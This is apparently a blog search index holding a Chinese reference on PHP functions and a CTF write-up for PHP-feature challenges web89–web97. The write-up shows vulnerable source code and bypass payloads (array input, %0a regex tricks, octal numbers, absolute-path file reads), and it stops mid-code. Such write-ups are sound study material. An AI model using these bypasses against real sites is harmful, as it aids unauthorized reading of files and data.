<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>常见PHP语法</title>
    <link href="/2023/05/07/php/"/>
    <url>/2023/05/07/php/</url>
    
    <content type="html"><![CDATA[<h2 id="Include"><a href="#Include" class="headerlink" title="Include()"></a>Include()</h2><p>Include(‘‘)用于获取指定文件中存在的所有文本，代码和标记，并复制到使用该语句的  </p><p>文件中，在服务器执行之前，将php文件的内容插入到另一个php文件。</p><h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>语法：<br>Sub(string,start,Length)<br><strong>string:</strong>  必须。规定要返回其中一部分的字符串。</p><blockquote><h4 id="start-必须。规定在字符串的何处开始。"><a href="#start-必须。规定在字符串的何处开始。" class="headerlink" title="start: 必须。规定在字符串的何处开始。"></a>start: 必须。规定在字符串的何处开始。</h4><ul><li>正数 - 在字符串的指定位置开始</li><li>负数 - 在从字符串结尾开始的指定位置开始</li><li>0 - 在字符串中的第一个字符处开始</li></ul></blockquote><blockquote><h4 id="Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。"><a href="#Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。" class="headerlink" title="Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。"></a>Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。</h4><ul><li>   正数 - 从 start 参数所在的位置返回的长度</li><li>   负数 - 从字符串末端返回的长度</li></ul></blockquote><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h2><p>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><blockquote><h4 id="int-intval-mixed-var-int-base-x3D-10"><a href="#int-intval-mixed-var-int-base-x3D-10" class="headerlink" title="int intval ( mixed $var [, int $base &#x3D; 10 ] )"></a>int intval ( mixed $var [, int $base &#x3D; 10 ] )</h4><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul></blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><h2 id="stype-alpha-函数"><a href="#stype-alpha-函数" class="headerlink" title="stype_alpha()函数"></a>stype_alpha()函数</h2><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>ctype_alpha()函数是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。</p><p>如果字符串只包含字母，返回bool <strong>true</strong> ，否则返回bool <strong>false</strong>。</p><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><p>ctype_alpha(string):bool</p><h2 id="Is-numerice-函数"><a href="#Is-numerice-函数" class="headerlink" title="Is_numerice()函数:"></a>Is_numerice()函数:</h2><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>函数用于检测变量是否为数字或数字字符串。<br>返回值：<br>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</p><h2 id="hexdec-函数"><a href="#hexdec-函数" class="headerlink" title="hexdec()函数:"></a>hexdec()函数:</h2><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><p>Hexdec()函数把十六进制转换为十进制。</p><h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><p>Hexdec(hex_string)</p><p>Hex_string:必须，规定要转换的十六进制数</p><h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数:"></a>preg_match()函数:</h2><p>Preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168186276216800222868537%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168186276216800222868537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev84%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。</p><h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><p>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</p><blockquote><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：<br> 1.PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul></blockquote><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p><h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace()函数"></a>str_replace()函数</h2><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>str_replace()函数替换字符串中的一些字符(区分大小写)。<br>该函数必须遵循下列规则：</p><blockquote><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul></blockquote><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>str_replace(find,replace,string,count)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>find</td><td>必需。规定要查找的值。</td></tr><tr><td>replace</td><td>必需。规定替换find中值的值。</td></tr><tr><td>string</td><td>必需。规定被搜索的字符串。</td></tr><tr><td>count</td><td>可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p>返回值：返回带有替换值的字符串或数组。</p><h2 id="strpoos-函数"><a href="#strpoos-函数" class="headerlink" title="strpoos()函数"></a>strpoos()函数</h2><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>查找字符串在另一字符串中第一次出现的位置<br>ps:strpos()函数对大小写敏感&amp;该函数是二进制安全的</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><strong>strpos(string,find,start)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要搜索的字符串。</td></tr><tr><td>find</td><td>必需。规定要查找的字符串。</td></tr><tr><td>start</td><td>可选。规定在何处开始搜索。</td></tr></tbody></table><h2 id="array-push-函数"><a href="#array-push-函数" class="headerlink" title="array_push()函数"></a>array_push()函数</h2><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>array_push()函数向数组尾部插入一个或多个元素</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p>array_push(array,valuel,value2…)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array</td><td>必需。规定一个数组。</td></tr><tr><td>value1</td><td>必需。规定要添加的值。</td></tr><tr><td>value2</td><td>可选。规定要添加的值。</td></tr></tbody></table><p>返回值：返回新数组的元素个数。</p><h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>in_array()函数搜索数组中是否存在指定的值</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p>bool in_array(mixed $needle,array $haystack[,bool $strict &#x3D; FALSE ])</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>needle</td><td>必需。规定要在数组搜索的值。</td></tr><tr><td>haystack</td><td>必需。规定要搜索的数组。</td></tr><tr><td>strict</td><td>可选。如果该参数设置TRUE,则in_array()函数检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>返回值：如果在数组中找到值则返回true，否则返回false</p><h2 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h2><h4 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h4><p>file_put_contents()函数把一个字符串写入文件中。<br>该函数访问文件时，遵循以下规则：<br>1.如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 <em>filename</em> 副本的内置路径<br>2.如果文件不存在，将创建一个文件<br>3.打开文件<br>4.如果设置了 LOCK_EX，那么将锁定文件<br>5.如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容<br>6.向文件中写入数据<br>7.关闭文件并对所有文件解锁<br>8.如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p><h4 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h4><p>int file_put_contents ( string $filename , mixed $data [, int $flags &#x3D; 0 [, resource $context ]] )</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件</td></tr><tr><td>data</td><td>必需。规定要写入文件的数据。可以是字符串、数组或数据流。</td></tr><tr><td>flags</td><td>可选。规定如何打开&#x2F;写入文件。可能的值：1.FILE_USE_INCLUDE_PATH。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。context是一套可以修改流的行为的选项</td></tr></tbody></table><p>使用 FILE_APPEND 避免删除文件中已存在的内容。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/2023/05/04/phptexin/"/>
    <url>/2023/05/04/phptexin/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看代码发现<br>preg_match过滤0-9，即发现有0-9，就输出no no no，然而intval函数的作用是返回变量的整数值，两者相互矛盾</p><p>这里可以通过数组绕过，构造payload：?num[]&#x3D;<br><img src="/images/00.png"></p><p>获得flag</p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>查看源码发现，第一个if是验证num是否存在，第二个if验证num是否为4476，如果是就出输出nonono，但第三个if是验证num<strong>取整</strong>后是否为4476，所以我们可以随便取一个4476.0-9，经过intval取整后即为4476符合条件，输出flag</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>查看源码<br>先看第一个if<br>preg_match()函数是用于一个正则表达式匹配<br>第一个if的意思是如果a的开头和结尾都是php，则进入下一个if<br>&#x2F;^php$&#x2F;im中 <strong>^</strong>表示开头 **$**表示结尾 &#x2F;i表示对大小写不敏感 &#x2F;m表示多行匹配</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>这个if的意思是匹配a开头和结尾是php，不区分大小写，如果开头结尾为php，则输出hacker</p><p>仔细对比发现，第二个if的过滤对比第一个少了一个多行匹配&#x2F;m，这可以用到Apache HTTPD换行解析漏洞<br><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">传送门</a><br>大概意思是：以前的1.php可以用1%0aphp访问，%0a表示换行符，那么综上所述，就可以绕过函数的过滤<br>构造payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=a%0aphp<br></code></pre></td></tr></table></figure><p>a%0aphp,首先是preg_match中的$(匹配结尾)匹配a%0aphp中的换行符，这个时候会匹配到%0a(将%0a当作换行)，那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php</p><p>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag<br><img src="/images/232.png"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题方式与90题一样，第一个if验证num是否合格，第三个if则是如果num取整后等于4476则输出flag,这里可以?num&#x3D;4476.(1-9都可以)</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>与92题解题方法一样，不同点在于93题加入了一个if函数来筛选，其实也不影响原本做题思路，加入了preg_match函数，作用是如果出现了a-z|A-Z的字符，就会输出nonono<br>下面还有一个函数intval，若num取整后等于4476，则输出flag，输入?num&#x3D;4476.2获取flag</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题与前几题并无太大区别，我们注意到本题添加了一个if语句，strops(string，find，start)用于检测字符串在另一字符串出现的位置，满足strpos($num, “0”)语句的条件是num里的数有0返回true，没0返回flase，需要注意以下这个函数前面有一个！号，如果我们要绕过这个if语句，就需要使我们的num里含有0，这样就会绕过这个if，同时下一个取整函数也不会耽搁?num&#x3D;4476.01 or ?num&#x3D;4476.0皆可</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次的preg_match函数不仅把字母过滤了还把.给过滤了，这样我们就不能进行上一题的操作了，我们可以利用进制转换的便利，这里我们可以用010574(4476的八进制)绕过，去看了看intval函数的发现最开头可以如果是+还是可以识别为原数，so，payload&#x3D;?num&#x3D;+010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125; <br></code></pre></td></tr></table></figure><p>第二个if表明了不能直接以相对路径读取，那么我们可以用绝对路径读<br>payload:?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>或者也可以返回上一级然后再回来读取<br>payload:?u&#x3D;..&#x2F;html&#x2F;flag.php<br>或者<br>payload:?u&#x3D;.&#x2F;flag.php</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span 